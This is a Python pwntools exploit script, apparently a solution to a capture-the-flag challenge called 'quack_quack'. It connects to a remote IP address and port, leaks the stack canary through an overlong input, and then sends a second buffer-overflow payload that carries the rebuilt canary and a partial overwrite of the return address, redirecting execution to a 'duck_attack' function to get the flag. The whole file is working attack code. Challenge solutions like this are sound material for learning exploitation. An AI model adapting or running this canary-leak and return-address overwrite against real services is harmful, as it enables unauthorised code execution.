from pwn import *
import time

# Main exploit
def main():
    binary = "./quack_quack"
    
    # Connect to remote server
    target = remote('83.136.251.68', 31046)
    
    # First payload to leak the canary
    target.recvuntil(b"> ")
    first_payload = b"A" * 89 + b"Quack Quack "  # Use our known working offset
    target.sendline(first_payload)
    
    # Get response with leaked canary bytes
    response = target.recvuntil(b"> ", drop=True)
    print("[*] Response:", response)
    
    # Extract the leaked bytes (after the NULL)
    leak = response.split(b'Quack Quack ')[1].split(b', ready')[0]
    print("[*] Leaked bytes:", leak.hex(), f"Length: {len(leak)}")
    
    # Reconstruct the full canary
    full_canary = b'\x00' + leak[:7]
    canary = u64(full_canary)
    print(f"[+] Reconstructed canary: 0x{canary:016x}")
    
    # Craft the second payload to execute duck_attack
    duck_attack_addr = 0x40137f
    
    # Payload structure: buffer + canary + saved RBP + return address
    second_payload = b"A" * 88  + p64(canary) + b"B" * 4 +  b"C" * 4 + b"\x7f\x13"
    target.sendline(second_payload)
    
    # Get the flag
    print("[*] Executing duck_attack to get the flag...")
    target.interactive()

if __name__ == "__main__":
    main()
